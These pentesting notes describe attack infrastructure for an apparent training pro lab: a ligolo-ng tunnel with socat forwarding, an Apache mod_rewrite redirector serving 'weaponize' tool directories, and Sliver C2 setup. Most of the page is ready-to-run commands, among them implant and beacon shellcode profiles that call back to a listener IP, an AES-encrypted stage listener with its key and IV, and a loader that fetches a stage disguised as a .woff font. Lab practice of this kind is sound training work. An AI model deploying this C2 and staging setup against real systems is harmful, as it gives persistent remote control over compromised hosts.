| 🏠 [Home](../../pentesting.md) | ⬅️ ⬅️ [Part](../_part) | ⬅️ [Chapter](./_chapter) |
|--------------------------------|----------------------|-------------------------|

-   [prolab Infra](#prolab-infra){#toc-prolab-infra}
    -   [Apache proxy](#apache-proxy){#toc-apache-proxy}
        -   [URI redirection](#uri-redirection){#toc-uri-redirection}
        -   [User Agent Redirection](#user-agent-redirection){#toc-user-agent-redirection}
    -   [sliver](#sliver){#toc-sliver}
    -   [links](#links){#toc-links}

# prolab Infra

-   port 443 for `ligolo-ng`:

    -   `sudo ligolo-ng-proxy -selfcert -laddr 0.0.0.0:4444`

    -   `sudo socat -d -d TCP-LISTEN:443,fork TCP:localhost:4444` (443
        to 4444)

-   port 80 for apache with redirectors :

-   redirections:

    -   http://\<ip\>/sliver/
        `http --lhost <ip|127.0.0.1> -lport <lport|8890>`

    -   http://\<ip\>/sharp/
        `uploadserver -b 127.0.0.1 8881 --directory /opt/windows/SharpCollection/NetFramework_4.7_x64`

    -   http://\<ip\>/win/
        `uploadserver -b 127.0.0.1 8882 --directory /opt/windows/windows_weaponize`

    -   http://\<ip\>/lin/
        `uploadserver -b 127.0.0.1 8883 --directory /opt/linux/linux_weaponize`

    -   http://\<ip\>/lab/
        `uploadserver -b 127.0.0.1 8884 --directory $(pwd)/utils`

    -   

## Apache proxy

use `.htaccess` instead of config. In order to use `.htaccess` files, we
must tell apache to allow the files to override rules in the config. In
the apache config, change None to All in the following block

    <Directory /var/www/>
        Options Indexes FollowSymLinks
        AllowOverride All
        Require all granted
    </Directory>

enable the module

    sudo sed -i 's|#LoadModule rewrite_module |LoadModule rewrite_module |' /etc/httpd/conf/httpd.conf 
    sudo sed -i 's|#LoadModule proxy_http_module |LoadModule proxy_http_module |' /etc/httpd/conf/httpd.conf 
    sudo sed -i 's|#LoadModule proxy_module |LoadModule proxy_module |' /etc/httpd/conf/httpd.conf 

Apache recommends that the server config file be used for `mod_rewrite`,
but we aren't running a production server and the benefit of not having
to reload apache2 every time we make a change means we will use
.htaccess.

### URI redirection

    root$ cat /srv/http/.htaccess
    RewriteEngine On
    RewriteCond %{REQUEST_URI} ^/sharp/(.*)$
    RewriteRule ^sharp/(.*)$ http://127.0.0.1:8881/$1 [P]
    RewriteCond %{REQUEST_URI} ^/win/(.*)$
    RewriteRule ^win/(.*)$ http://127.0.0.1:8882/$1 [P]
    RewriteCond %{REQUEST_URI} ^/lin/(.*)$
    RewriteRule ^lin/(.*)$ http://127.0.0.1:8883/$1 [P]
    RewriteCond %{REQUEST_URI} ^/lab/(.*)$
    RewriteRule ^lab/(.*)$ http://127.0.0.1:8884/$1 [P]
    ####
    # SLIVER C2
    ####
    RewriteCond %{REQUEST_URI} ^/sliver/(.*)$
    RewriteRule ^sliver/(.*)$ http://127.0.0.1:8890/$1 [P]
    ####
    # SLIVER STAGE LISTENER
    ####
    RewriteCond %{REQUEST_URI} ^/s_fh/(.*)$
    RewriteRule ^s_fh/(.*)$ http://127.0.0.1:8870/$1 [P]
    ####
    # SLIVER BEACON STAGE LISTENER
    ####
    RewriteCond %{REQUEST_URI} ^/s_b_fh/(.*)$
    RewriteRule ^s_b_fh/(.*)$ http://127.0.0.1:8871/$1 [P]

### User Agent Redirection

## sliver

    ###############
    # http listener
    ############### 
    http --lhost 127.0.0.1 --lport 8890 --persistent 

    # generate --http 10.10.16.179:80/sliver/initial -N sliv_footh
    # generate beacon --http 10.10.16.179:80/sliver/initial -N b_sliv_fh --seconds 15 --jitter 1
    ###############
    # Shellcodes
    ############### 
    profiles new --http  http://10.10.16.179:80/sliver/initial --skip-symbols --format shellcode --arch amd64 sliv_fh
    profiles new beacon --http  http://10.10.16.179:80/sliver/initial --skip-symbols --format shellcode --arch amd64 --seconds 15 --jitter 1 b_sliv_fh
    ###############
    # stage listener
    ############### 
    stage-listener --url http://127.0.0.1:8871 --profile b_sliv_fh  --prepend-size --aes-encrypt-key D(H+KbPeShVmYq3t6v9y$B&E)H@McQfT --aes-encrypt-iv 9y/B?E(G+KbPeShV -C zlib

    # shellcode loader
    slvrct.exe -m -c zlib -e RChIK0tiUGVTaFZtWXEzdDZ2OXkkQiZFKUhATWNRZlQ= http://192.168.2.3/s_b_fh/pwn.woff

## links

-   [Strengthen Your Phishing with Apache mod_rewrite and Mobile User
    Redirection](https://bluescreenofjeff.com/2016-03-22-strengthen-your-phishing-with-apache-mod_rewrite-and-mobile-user-redirection/)

-   [Test your htaccess rewrite
    rules](https://htaccess.madewithlove.com/)
